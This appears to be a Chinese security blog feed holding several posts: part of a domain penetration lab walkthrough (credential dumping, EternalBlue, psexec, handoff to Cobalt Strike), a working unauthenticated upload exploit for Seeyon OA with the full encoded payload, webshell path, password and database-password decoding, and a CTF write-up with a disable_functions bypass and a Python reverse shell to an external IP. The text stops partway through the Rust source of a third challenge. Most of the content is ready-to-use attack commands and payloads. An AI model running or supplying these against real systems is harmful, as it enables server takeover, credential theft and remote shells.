<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190254536.png"></p>
<h4 id="查看主域控制器"><a href="#查看主域控制器" class="headerlink" title="查看主域控制器"></a>查看主域控制器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190634472.png"></p>
<h4 id="定位主域控制器"><a href="#定位主域控制器" class="headerlink" title="定位主域控制器"></a>定位主域控制器</h4><p>拿到主域控制器名称后，执行以下命令定位目标主机在内网的IP为<code>10.10.10.10</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping DC.de1ay.com</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190724304.png"></p>
<h3 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h3><p>由于我们拿到shell了，利用后渗透阶段的基于arp协议探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185018605.png"></p>
<p>发现存活主机<code>10.10.10.10</code>和<code>10.10.10.201</code></p>
<h3 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h3><h4 id="抓取Hash"><a href="#抓取Hash" class="headerlink" title="抓取Hash"></a>抓取Hash</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185330714.png"></p>
<h4 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h4><p>我们先将进程迁移到64位程序中，比如PID为516的lsass.exe进程</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803115943337.png"></p>
<p>使用msf中的kiwi模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi         #加载kiwi模块</span><br><span class="line">creds_all         #抓取所有明文密码</span><br></pre></td></tr></table></figure>

<p>抓取到明文密码</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185443908.png"></p>
<h3 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h3><p>我们前面知道还存在<code>10.10.10.0/24</code>网段，借助MSF 的 autoroute 模块获取当前机器的所有网段信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803120318190.png"></p>
<p>尝试探测<code>10.10.10.201</code>的445端口是否开放</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set RHOSTS 10.10.10.201</span><br><span class="line">set THREADS 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803125157642.png"></p>
<p>开启445端口的话，尝试使用永恒之蓝漏洞，利用失败</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOSTS 10.10.10.201</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803134559161.png"></p>
<p>尝试直接psexec横向移动，利用失败</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOSTS 10.10.10.201</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass 1qaz@WSX</span><br><span class="line">set SMBDomain DE1AY</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803194339654.png"></p>
<p>只好联动metasploit上线cs试试</p>
<p>启动服务端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver 192.168.132.133 rev1ve</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803140752989.png"></p>
<p>然后启动客户端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>

<p>创建监听器，监听本地1028端口</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803140910385.png"></p>
<p>在metasploit把shell弹到cs上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.132.133</span><br><span class="line">set lport 1028</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>成功上线cs，然后选择刚刚的监听器进行提权</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803195135476.png"></p>
<p>我们先进行端口扫描不然视图没有<code>10.10.10.201</code>的IP地址，然后抓取Hash和明文密码</p>
<p>接着创建SMB监听器，在左上角点击显示目标。选择域控主机点击<code>jump =&gt; psexec</code></p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803195918584.png"></p>
<p>填写信息，选择我们刚刚创建的SMB监听器以及SYSTEM权限的shell</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803200249965.png"></p>
<p>成功上线域控主机</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803200338831.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>环境搭建：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_45780190/article/details/123156086">https://blog.csdn.net/qq_45780190/article/details/123156086</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>域渗透</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>致远OA-ajax.do任意文件上传漏洞</title>
    <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
<span id="more"></span>

<h1 id="致远OA-ajax-do任意文件上传漏洞"><a href="#致远OA-ajax-do任意文件上传漏洞" class="headerlink" title="致远OA-ajax.do任意文件上传漏洞"></a>致远OA-ajax.do任意文件上传漏洞</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
<p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
</blockquote>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">致远OA V8.0</span><br><span class="line">致远OA V7.1、V7.1SP1</span><br><span class="line">致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">致远OA V6.0、V6.1SP1、V6.1SP2</span><br><span class="line">致远OA V5.x</span><br><span class="line">致远OA G6</span><br></pre></td></tr></table></figure>

<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>首先验证漏洞是否存在，访问如下url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br></pre></td></tr></table></figure>

<p>如果出现异常页面，则漏洞可能存在</p>
<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214529204.png"></p>
<p>POC如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>

<p>如果漏洞利用成功，回显如下界面</p>
<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214707896.png"></p>
<p>利用失败的话回显如下，或者页面空白，警告等</p>
<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214945750.png"></p>
<p><strong>利用成功后用冰蝎连接</strong> <a href="https://github.com/rebeyond/Behinder/releases">工具链接</a></p>
<p>webshell路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/SeeyonUpdate1.jspx</span><br></pre></td></tr></table></figure>

<p>连接密码：rebeyond</p>
<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412215119512.png"></p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>连接上马后即可命令执行，同样我们可以进行数据库连接从而实现敏感信息泄露</p>
<p>当然前提是知道连接数据库的密码 <a href="https://www.cmdhack.com/archives/212.html">参考文章</a></p>
<p>致远OA数据库配置文件路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Seeyon/A8/base/conf/datasourceCtp.properties</span><br></pre></td></tr></table></figure>

<p>访问可以找到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.backup.path=</span><br><span class="line">db.hibernateDialect=org.hibernate.dialect.SQLServerDialect</span><br><span class="line">ctpDataSource.username=sa</span><br><span class="line">workflow.dialect=SQLServer</span><br><span class="line">ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class="line">ctpDataSource.password=/1.0/UWJ0dHgxc2U=</span><br><span class="line">ctpDataSource.url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=seeyou2;maxStatements=0;SelectMethod=cursor</span><br><span class="line">mysql.path=</span><br><span class="line">ctpDataSource.maxCount=2000</span><br></pre></td></tr></table></figure>

<p>不过这里的密码是经过加密的，<code>1.0</code>表示左偏移一位，对应解密成明文</p>
<p>解密脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;</span><br><span class="line">password = &quot;Ab123456&quot;</span><br><span class="line">for i in password:</span><br><span class="line">    a+= chr(ord(i) -1 )</span><br><span class="line"></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>

<p>得到密码后即可连接数据库造成敏感信息泄露</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>红明谷杯 2024</title>
    <url>/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024.html</url>
    <content><![CDATA[<p>pcntl_exec绕过disable_function限制、Rust语言</p>
<span id="more"></span>

<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><blockquote>
<p>php版本为8.3.2</p>
</blockquote>
<p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// flag.php</span><br><span class="line">if (isset($_POST[&#x27;f&#x27;])) &#123;</span><br><span class="line">    echo hash_file(&#x27;md5&#x27;, $_POST[&#x27;f&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>注意到<code>hash_file</code>函数，有点像侧信道攻击的<code>file</code>函数，去网上搜到有关<code>fliter_chains</code>的<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">exp</a></p>
<p>该脚本可利用函数<code>file()</code> 、 <code>hash_file()</code> 、 <code>file_get_contents()</code> 或 <code>copy()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 filters_chain_oracle_exploit.py --target url --file &#x27;flag.php&#x27; --parameter f</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240404112621747.png"></p>
<p>爆出来参数为ezphpPhp8，加上参数就可以看到<code>flag.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;ezphpPhp8&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;No&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$a = new class &#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&#x27;cat /flag&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">unset($a);</span><br><span class="line">$a = $_GET[&#x27;ezphpPhp8&#x27;];</span><br><span class="line">$f = new $a();</span><br><span class="line">$f-&gt;getflag();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后这里的 $a 是匿名类，但是 unset 会销毁变量，这下不会了</p>
<p>这个时候要找一下如何触发一个匿名类 <a href="https://hi-arkin.com/archives/php-anonymous-stdClass.html">参考文章</a></p>
<p>匿名类的类名与文件所在行列相关，即同一个位置实例出来的类为同一个类</p>
<p>也就是说虽然被销毁了但是我们实例化出来是一样的类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$obj=new class&#123;&#125;;</span><br><span class="line">// class名为: &#x27;class@anonymous&#x27;+chr(0)+php文件路径+行数$列数</span><br><span class="line">echo get_class($obj);</span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/flag.php?ezphpPhp8=<span class="class"><span class="keyword">class</span>@<span class="title">anonymous</span>%00/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">flag</span>.<span class="title">php</span>:7$0</span></span><br></pre></td></tr></table></figure>

<p>这里的列数是随机的，bp抓包爆破一下即可</p>
<h1 id="unauth"><a href="#unauth" class="headerlink" title="unauth"></a>unauth</h1><p>打开题目有个弹框登录</p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403200058890.png"></p>
<p>扫目录发现有日志文件泄露，得到admin密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-01-01 12:34:56]  Authentication successful - User: admin Pass: 2e525e29e465f45d8d7c56319fe73036</span><br></pre></td></tr></table></figure>

<p>成功登录，源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!isset($_SERVER[&#x27;PHP_AUTH_USER&#x27;])) &#123;</span><br><span class="line">    header(&#x27;WWW-Authenticate: Basic realm=&quot;Restricted Area&quot;&#x27;);</span><br><span class="line">    header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);</span><br><span class="line">    echo &#x27;小明是运维工程师，最近网站老是出现bug。&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $validUser = &#x27;admin&#x27;;</span><br><span class="line">    $validPass = &#x27;2e525e29e465f45d8d7c56319fe73036&#x27;;</span><br><span class="line"></span><br><span class="line">    if ($_SERVER[&#x27;PHP_AUTH_USER&#x27;] != $validUser || $_SERVER[&#x27;PHP_AUTH_PW&#x27;] != $validPass) &#123;</span><br><span class="line">        header(&#x27;WWW-Authenticate: Basic realm=&quot;Restricted Area&quot;&#x27;);</span><br><span class="line">        header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);</span><br><span class="line">        echo &#x27;Invalid credentials&#x27;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>尝试查看phpinfo发现不行，写个马蚁剑连接先</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=eval($_POST[1]);</span><br></pre></td></tr></table></figure>

<p>记得下面的请求信息带上请求头<code>Authorization：Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY=</code></p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403212517974.png"></p>
<p>查看<code>php.ini</code>，禁用函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink</span><br></pre></td></tr></table></figure>

<p>我们在php拓展注意到<code>pcntl.so</code></p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403212849023.png"></p>
<p>去网上搜到利用<code>pcntl_exec</code>绕过disable_function限制 <a href="https://cn-sec.com/archives/228037.html">参考文章</a></p>
<p>并且此函数刚好没有被禁用，payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?cmd=?&gt;&lt;?=eval($_POST[1]);</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">1=?&gt;&lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&#x27;-c&#x27;, &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;47.242.11.183&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));?&gt;</span><br></pre></td></tr></table></figure>

<p>成功反弹shell后，尝试suid提权，发现有su命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su admin</span><br></pre></td></tr></table></figure>

<p>密码在<code>config.inc.php</code></p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403221132681.png"></p>
<p>成功提权得到flag</p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403213853106.png"></p>
<h1 id="playground"><a href="#playground" class="headerlink" title="playground"></a>playground</h1><blockquote>
<p>Rust</p>
</blockquote>
<p>源码如下</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[macro_use]</span> <span class="keyword">extern</span> <span class="keyword">crate</span> rocket;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">use</span> std::fs;  </span><br><span class="line"><span class="keyword">use</span> std::fs::File;  </span><br><span class="line"><span class="keyword">use</span> std::io::Write;  </span><br><span class="line"><span class="keyword">use</span> std::process::Command;  </span><br><span class="line"><span class="keyword">use</span> rand::Rng;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">index</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;  </span><br><span class="line">    fs::<span class="title function_ invoke__">read_to_string</span>(<span class="string">&quot;main.rs&quot;</span>).<span class="title function_ invoke__">unwrap_or</span>(<span class="type">String</span>::<span class="title function_ invoke__">default</span>())  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/rust_code&quot;</span>, data = <span class="string">&quot;&lt;code&gt;&quot;</span>)]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">run_rust_code</span>(code: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> code.<span class="title function_ invoke__">contains</span>(<span class="string">&quot;std&quot;</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: std is not allowed&quot;</span>.<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//generate a random 5 length file name  </span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">file_name</span> = rand::<span class="title function_ invoke__">thread_rng</span>()  